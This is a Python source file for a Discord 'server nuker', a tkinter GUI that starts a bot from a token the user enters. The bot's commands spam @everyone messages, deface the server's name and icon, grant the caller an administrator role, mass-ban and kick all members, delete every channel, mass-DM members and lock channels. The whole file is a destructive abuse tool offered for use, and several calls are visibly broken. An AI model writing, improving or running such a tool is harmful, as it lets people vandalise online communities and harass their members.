import tkinter as tk
import discord
from random import choice
from discord.ext import commands
from time import sleep
win = tk.Tk()
win.geometry("500x700")
win.configure(bg="black")
win.resizable(0,0)
win.title("Server Nucker Discord V 1.0.5 | Ranger404Script")
photo = tk.PhotoImage(file=".\\app\\newbie.png")
#lablee = tk.Label(win,image=photo)
#lablee.pack()
#Token Bot
token_lable = tk.Label(win,text="Token >",fg="green",bg="black",font=("Arial",14))
token_lable.pack()
token = tk.Entry(win,width=60,fg="green",bg="gray",font=("Montserrat",11))
token.pack()

#Status Bot
status_lable = tk.Label(win,text="Status >",fg="red",bg="black",font=("Arial",14))
status_lable.pack()
status = tk.Entry(win,width=60,fg="red",bg="gray",font=("Montserrat",11))
status.pack()

#Perfix Bot 
perfix_lable = tk.Label(win,text="Perfix >",fg="yellow",bg="black",font=("Arial",14))
perfix_lable.pack()
perfix = tk.Entry(win,width=60,fg="yellow",bg="gray",font=("Montserrat",11))
perfix.pack()

#Message Spam
message_lable = tk.Label(win,text="Message >",fg="purple",bg="black",font=("Arial",14))
message_lable.pack()
message = tk.Entry(win,width=60,fg="purple",bg="gray",font=("Montserrat",11))
message.pack()

#Name Server
name_server_lable = tk.Label(win,text="Name Server >",fg="blue",bg="black",font=("Arial",14))
name_server_lable.pack()
name_server = tk.Entry(win,width=60,fg="blue",bg="gray",font=("Montserrat",11))
name_server.pack()

#Reason Kick\Ban
reason_lable = tk.Label(win,text="Reason Ban\Kick >",fg="white",bg="black",font=("Arial",14))
reason_lable.pack()
reason = tk.Entry(win,width=60,fg="white",bg="gray",font=("Montserrat",11))
reason.pack()

#Amount Msg\Channel
amount_lable = tk.Label(win,text="Amount Msg\Channel >",fg="Aqua",bg="black",font=("Arial",14))
amount_lable.pack()
amount = tk.Entry(win,width=60,fg="Aqua",bg="gray",font=("Montserrat",11))
amount.pack()

#Mesage Dm All
dmall_lable = tk.Label(win,text="Message Dm All >",fg="orange",bg="black",font=("Arial",14))
dmall_lable.pack()
dmallmsg = tk.Entry(win,width=60,fg="orange",bg="gray",font=("Montserrat",11))
dmallmsg.pack()

#Nick Name
nick_lable = tk.Label(win,text="Nick Name >",fg="orange",bg="black",font=("Arial",14))
nick_lable.pack()
nickname = tk.Entry(win,width=60,fg="orange",bg="gray",font=("Montserrat",11))
nickname.pack()
#Bot Codes
def bot_start():
    text.configure(text="Fake Crash Run & Bot Run")
    #get token , status , perfix , message

    token_bot = token.get()
    status_bot = status.get() + " | " + "Ranger 404 Script"
    perfix_bot = perfix.get()
    message_bot = message.get() + " | " + "Ranger 404 Script" + " | " + "@everyone @here"
    name_server_bot = name_server.get()
    reason_bot = reason.get()
    amount_bot = int(amount.get())
    dmall_bot = dmallmsg.get()
    nick_bot = nickname.get()


    #confing bot

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=perfix_bot,intents=intents)

    #bot event

    @bot.event
    async def on_ready():
        await bot.change_presence(activity=discord.Streaming(name_server=status_bot, url='https://twitch.tv/ranger404script'))
        #text.configure(text="Bot Is Run & Status Set.")
    
    #commands

    @bot.command()
    async def spam(ctx):
        count = 0
        for i in range(amount_bot):
            count +=1
            await ctx.send(message_bot)
            #text.configure(text=f"{count} Message Send .")

    @bot.command()
    async def server(ctx):
        guild = ctx.message.guild
        with open('.\\app\\server.png', 'rb') as f:
            icon = f.read()
        name_server = f"Server Fuck By {name_server_bot} & Ranger404 Script"
        await ctx.guild.edit(name_server=name_server)
        await ctx.guild.edit(icon=icon)

    @bot.command()
    async def power(ctx):
        guild = ctx.message.guild
        user = ctx.message.author
        await guild.create_role(name_server=name_server_bot, colour = discord.Colour.blue(), permissions=permissions)
        role = discord.utils.get(ctx.guild.roles, name_server=name_server_bot)
        permissions = discord.Permissions()
        permissions.update(administrator = True)
        await user.add_roles(role)

    @bot.command()
    async def create(ctx):
        name_server = name_server_bot
        guild = ctx.message.guild
        count = 0
        for i in range(amount_bot):
            count +=1
            #text.configure(text=f"{count} Channel Create .")
            await guild.create_text_channel(name_server)

    @bot.command()
    async def ban(ctx):
        count = 0
        for member in list(ctx.guild.members):
            try:
                count +=1
                await member.ban(reason=f'Server Hackid By {name_server_bot} & Ranger404Script')
                color = choice(["red","blue","green",'white',"purple"])
                #text.configure(text=f"{count} Ban .",fg=color)
            except:
                pass

    @bot.command()
    async def nuck(ctx):
        guild = ctx.guild
        for channel in guild.channel:
            await channel.delete()
    @bot.command()
    async def kick(ctx):
        for member in ctx.guild.members : 
            await member.kick(reason=reason_bot)
    @bot.command()
    async def dmall(ctx):
        for m in bot.get_all_members():
            await m.send(dmall_bot)
    @bot.command()
    async def nick(ctx):
        nick = nick_bot
        for member in ctx.guild.members:
                    if(member.nick == nick):
                        await member.edit(nick=nick)
    @bot.command()
    async def unlock(ctx):
        guild = ctx.guild
        for channel in guild.channel:
            await channel.set_permissions(guild.default_role, send_messages=True)
    @bot.command()
    async def lock(ctx):
        guild = ctx.guild
        for channel in guild.channel:
            await channel.set_permissions(guild.default_role, send_messages=False)


    #run bot

    bot.run(token_bot)

def test():
    tokenn =  amount.get()
    if tokenn == "":
        text.configure(text="Not Token , Amount , Name , Status , Perfix \n NickName , Reason , Messag Dm All , Message \nFound!!")
    else :
        text.configure(text="Wait For Fake Crash & Bot Run")
        bot_start()
#Start Bot
start = tk.Button(win,image=photo,font=("Arial",14),fg="red",bg="black",height=80,width=170,command=lambda:test())
start.pack()

#Text Info
texti = tk.Label(text="Press Run For Run Bot (:",fg="white",bg="black",font=("Montserrat",12))
texti.pack()

#Text
text = tk.Label(text="[INFO]",fg="yellow",bg="black",font=("Montserrat",15))
text.pack()

#Run
win.mainloop()
__name_server__ = "ranger404script"
